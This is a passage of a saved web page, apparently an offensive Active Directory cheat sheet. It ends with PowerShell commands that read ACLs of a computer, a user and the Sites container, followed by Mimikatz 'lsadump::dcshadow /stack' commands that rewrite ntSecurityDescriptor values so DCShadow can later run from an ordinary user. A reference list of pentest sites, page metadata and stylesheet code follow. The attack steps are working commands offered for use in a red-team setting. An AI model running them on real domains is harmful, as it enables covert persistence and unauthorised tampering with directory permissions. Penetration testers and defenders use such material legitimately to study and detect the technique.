<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1006px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1005.86px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryEntry</span><span class="cm-punctuation">(</span><span class="cm-string">"LDAP://CN=machine-user1,CN=Computers,DC=domain,DC=local"</span><span class="cm-punctuation">)).</span><span class="cm-identifier">psbase</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSecurity</span><span class="cm-punctuation">.</span><span class="cm-identifier">sddl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-for-the-target-user-">For the target user :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 919px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 919px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryEntry</span><span class="cm-punctuation">(</span><span class="cm-string">"LDAP://CN=user2,CN=Users,DC=domain,DC=local"</span><span class="cm-punctuation">)).</span><span class="cm-identifier">psbase</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSecurity</span><span class="cm-punctuation">.</span><span class="cm-identifier">sddl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-for-the-site-contain">For the Site Container :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 977px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 976.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryEntry</span><span class="cm-punctuation">(</span><span class="cm-string">"LDAP://CN=Sites,CN=Configuration,DC=domain,DC=local"</span><span class="cm-punctuation">)).</span><span class="cm-identifier">psbase</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSecurity</span><span class="cm-punctuation">.</span><span class="cm-identifier">sddl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-stack-the-queries">Stack the queries</h4>
<p id="bkmrk-after-have-get-the-a">After have get the ACLs and have appended the new ACEs for each one, we can stack the different queries to make a big DCShadow query<br>
For each one :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 774px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 774.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /stack /object:&lt;object&gt; /attribute:ntSecurityDescriptor /value:&lt;newACL_after_the_append&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-then-just-lsadump%3A%3Ad">Then just <code>lsadump::dcshadow</code></p>
<p id="bkmrk-dcshadow-can-now-be-">DCShadow can now be run from a user DCShadow-ed</p>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-the-hacker-recipes-p"><li>
<a href="https://www.thehacker.recipes/">The Hacker Recipes</a>
</li>
<li>
<a href="https://www.pentesteracademy.com/">Pentester Academy</a>
</li>
<li>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadAllTheThings</a>
<ul><li>
<a href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/">New version</a>
</li>
</ul></li>
<li>
<a href="https://cube0x0.github.io/">Cube0x0</a>
</li>
<li>
<a href="https://book.hacktricks.xyz/welcome/readme">HackTricks</a>
</li>
<li>
<a href="https://cheatsheet.haax.fr/">Haax</a>
</li>
<li>
<a href="https://www.ired.team/">Red Teaming Experiments</a>
</li>
<li>
<a href="https://posts.specterops.io/">SpecterOps</a>
</li>
<li>
<a href="https://www.semperis.com/blog/">Semperis</a>
</li>
<li>
<a href="https://www.trustedsec.com/blog/">TrustedSec</a>
</li>
<li>
<a href="https://bloodhound.readthedocs.io/en/latest/index.html">BloodHound</a>
</li>
<li>
<a href="https://dirkjanm.io/">Dirk-jan Mollema</a>
</li>
<li>
<a href="https://ppn.snovvcrash.rocks/">Snovvcrash</a>
</li>
<li>
<a href="https://exploit.ph/">Exploit.ph</a>
</li>
<li>
<a href="https://blog.xpnsec.com/">Adam Chester</a>
</li>
<li>
<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a>
</li>
<li>
<a href="https://pentestlab.blog/">Pentestlab.blog</a>
</li>
<li>
<a href="https://z4ksec.github.io/posts/masky-release-v0.0.3/">Masky release</a>
</li>
<li>
<a href="https://www.hackthebox.com/">Hack The Box</a>
</li>
</ul>
    </div>        </div>
    </main>

    <div id="sibling-navigation" class="grid half collapse-xs items-center mb-m px-m no-row-gap fade-in-when-active print-hidden">
    <div>
                    <a href="https://hideandsec.sh/books/cheatsheets-82c/chapter/microsoft" class="outline-hover no-link-style block rounded">
                <div class="px-m pt-xs text-muted">Previous</div>
                <div class="inline-block">
                    <div class="icon-list-item no-hover">
                        <span class="text-chapter "><svg class="svg-icon" data-icon="chapter" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 9H9V9h10v2zm-4 4H9v-2h6v2zm4-8H9V5h10v2z"></path>
</svg></span>
                        <span>Microsoft</span>
                    </div>
                </div>
            </a>
            </div>
    <div>
                    <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services" class="outline-hover no-link-style block rounded text-xs-right">
                <div class="px-m pt-xs text-muted text-xs-right">Next</div>
                <div class="inline block">
                    <div class="icon-list-item no-hover">
                        <span class="text-page "><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
                        <span>Active Directory Certificate Services</span>
                    </div>
                </div>
            </a>
            </div>
</div>
                </div>
        </div>

        <div class="tri-layout-right print-hidden pt-m">
            <aside class="tri-layout-right-contents">
                    <div id="page-details" class="entity-details mb-xl">
        <h5>Details</h5>
        <div class="body text-small blended-links">
            <div class="entity-meta">
    
            <div>
                        <svg class="svg-icon" data-icon="history" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"></path>
</svg>Revision #22
                    </div>
    
    
            <div>
            <svg class="svg-icon" data-icon="star" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>Created <span title="Tue, Jun 15, 2021 7:52 PM">1 year ago</span> by <a href="https://hideandsec.sh/user/blackwasp">BlackWasp</a>
        </div>
    
            <div>
            <svg class="svg-icon" data-icon="edit" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>Updated <span title="Tue, Oct 4, 2022 9:02 PM">14 hours ago</span> by <a href="https://hideandsec.sh/user/blackwasp">BlackWasp</a>
        </div>
    </div>
            
            
                            <div class="active-restriction">
                                            <svg class="svg-icon" data-icon="lock" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <path d="M0 0h24v24H0V0z" id="a"></path>
    </defs>
    <clipPath id="b">
        <use overflow="visible" xlink:href="#a"></use>
    </clipPath>
    <path clip-path="url(#b)" d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM8.9 6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2H8.9V6zM18 20H6V10h12v10z"></path>
</svg>Page Permissions Active
                                    </div>
            
                    </div>
    </div>

    <div class="actions mb-xl">
        <h5>Actions</h5>

        <div class="icon-list text-primary">

            
                                                            
            <hr class="primary-background">

                                        <div component="dropdown" class="dropdown-container" id="export-menu">
    <div refs="dropdown@toggle" class="icon-list-item" aria-haspopup="true" aria-expanded="false" aria-label="Export" tabindex="0">
        <span><svg class="svg-icon" data-icon="export" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"></path>
</svg></span>
        <span>Export</span>
    </div>
    <ul refs="dropdown@menu" class="wide dropdown-menu" role="menu">
        <li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory/export/html" target="_blank" rel="noopener">Contained Web File <span class="text-muted float right">.html</span></a></li>
        <li></li>
        <li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory/export/plaintext" target="_blank" rel="noopener">Plain Text File <span class="text-muted float right">.txt</span></a></li>
        <li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory/export/markdown" target="_blank" rel="noopener">Markdown File <span class="text-muted float right">.md</span></a></li>
    </ul>
</div>
                    </div>

    </div>
            </aside>
        </div>
    </div>

    </div>

    
    <div back-to-top="" class="primary-background print-hidden">
        <div class="inner">
            <svg class="svg-icon" data-icon="chevron-up" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg> <span>Back to top</span>
        </div>
    </div>

        
    


</body></html>
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: cid:css-717f78a7-f49d-4463-8d63-3e610c6a5689@mhtml.blink

@charset "utf-8";

:root { --color-primary: #000000; --color-primary-light: rgba(0,0,0,0.15); --color-bookshelf: #a94747; --color-book: #077b70; --color-chapter: #af4d0d; --color-page: #206ea7; --color-page-draft: #7e50b1; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: cid:css-544246fd-e1cf-4d4f-a16b-b85b9cdc8347@mhtml.blink

@charset "utf-8";

@import url("https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,400;0,600;0,700;0,900;1,400;1,600;1,700;1,900&display=swap");

body { font-size: 16px; background-color: rgb(15, 17, 21); color: rgb(248, 248, 242); font-family: "Source Sans Pro", sans-serif !important; }

h1 { font-family: Roboto, sans-serif !important; }

div.page-content a:link { color: rgb(0, 204, 255) !important; }

div.page-content a:visited { color: rgb(0, 204, 255) !important; }

div.page-content a:hover { color: rgb(0, 204, 255) !important; }

div.page-content a:active { color: rgb(0, 204, 255) !important; }

code { color: rgb(80, 250, 123); background-color: rgb(32, 32, 32); white-space: pre-line; padding: 4px 3px; border-color: rgba(255, 250, 250, 0.34); }

.page-content del { background: rgb(255, 85, 85) !important; }

.card .entity-list-item:not(.no-hover):hover { background-color: rgb(68, 71, 90) !important; }

.page-content ins { background: rgb(80, 250, 123) !important; color: rgb(8, 9, 11) !important; }

.suggestion-box { border: 1px solid rgb(187, 187, 187); background-color: rgb(8, 9, 11) !important; box-shadow: none !important; border-radius: 0px !important; }

.suggestion-box li:last-child { border-bottom: 0px; }

.suggestion-box li.active { background-color: rgb(68, 71, 90) !important; }

.card .entity-list-item:not(.no-hover):hover { background-color: rgb(68, 71, 90) !important; }

.card-title { text-transform: uppercase; color: rgb(248, 248, 242); fill: rgb(248, 248, 242); font-weight: 400; }

.markdown-editor-display { background-color: rgb(8, 9, 11); }

.markdown-editor-display body { background-color: rgb(8, 9, 11); }

.breadcrumb-listing-entity-list { background-color: rgb(8, 9, 11) !important; }

.breadcrumb-listing .breadcrumb-listing-toggle:hover { fill: rgb(248, 248, 242); border-color: transparent; }

.entity-meta { fill: rgb(248, 248, 242) !important; }

.book-tree .sidebar-page-list .entity-list-item.selected { background-color: rgb(68, 71, 90); }

table.table tr:hover { background-color: rgb(68, 71, 90); }

.tri-layout-mobile-tab:first-child { border-right: 0px; background: rgb(8, 9, 11); }

.tri-layout-mobile-tab { text-align: center; border-bottom: 0px; cursor: pointer; background: rgb(40, 42, 54); }

.tri-layout-mobile-tab.active { background: rgb(68, 71, 90); }

.tri-layout-mobile-tabs { border: 0px; }

.entity-selector .entity-list-item { background-color: rgb(8, 9, 11); }

.entity-selector { border: 0px; }

blockquote { border-left: 4px solid rgb(139, 233, 253); background-color: transparent !important; }

header .header-links { background-color: transparent; }

header .links a:hover, header .dropdown-container ul li a:hover { background-color: rgb(68, 71, 90); }

@media screen and (max-width: 1000px) {
  header .header-links { background-color: rgb(8, 9, 11); }
}

#header { background-color: rgb(25, 27, 32) !important; }

div.CodeMirror { border: 0px; border-radius: 8px; }

form[action*="https://hideandsec.sh/settings/users/toggle-dark-mode"] { display: none; }

form[action*="https://hideandsec.sh/settings/users/2/switch-shelves-view"] { display: none; }

a[href*="/export/pdf"] { display: none; }

img.coolpicture { display: none; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,400;0,600;0,700;0,900;1,400;1,600;1,700;1,900&display=swap

@charset "utf-8";

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7qsDJB9cme_xc.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7jsDJB9cme_xc.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7rsDJB9cme_xc.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7ksDJB9cme_xc.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7osDJB9cme_xc.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7psDJB9cme_xc.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK1dSBYKcSV-LCoeQqfX1RYOo3qPZ7nsDJB9cme.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdh18S0xR41YDw.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdo18S0xR41YDw.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdg18S0xR41YDw.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdv18S0xR41YDw.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdj18S0xR41YDw.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCdi18S0xR41YDw.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZY4lCds18S0xR41.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdh18S0xR41YDw.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdo18S0xR41YDw.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdg18S0xR41YDw.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdv18S0xR41YDw.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdj18S0xR41YDw.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

